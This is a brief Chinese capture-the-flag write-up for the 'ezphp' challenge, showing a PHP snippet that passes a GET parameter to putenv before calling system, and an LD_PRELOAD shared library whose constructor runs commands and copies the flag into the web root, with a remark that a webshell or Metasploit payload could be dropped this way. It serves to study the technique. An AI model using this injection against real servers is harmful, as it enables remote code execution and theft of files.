## ezphp #LD_PRELOAD
考点 Nginx的缓存机制
当时刚好看了p神的环境变量执行命令思维直接跑偏了

```PHP
<?php (empty($_GET["env"])) ? highlight_file(__FILE__) : putenv($_GET["env"]) && system('echo hfctf2022');?>
```

编译为so文件
`gcc -shared -fPIC exp.c -o exp.so`
exp.c
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void preload (void){
	  unsetenv("LD_PRELOAD");
	    system("id");
	      system("cat /flag > /var/www/html/flag");
}
```

>这里如果不添加unsetenv的话会死循环
>system如果是php的话可以用来写马或者上msf马

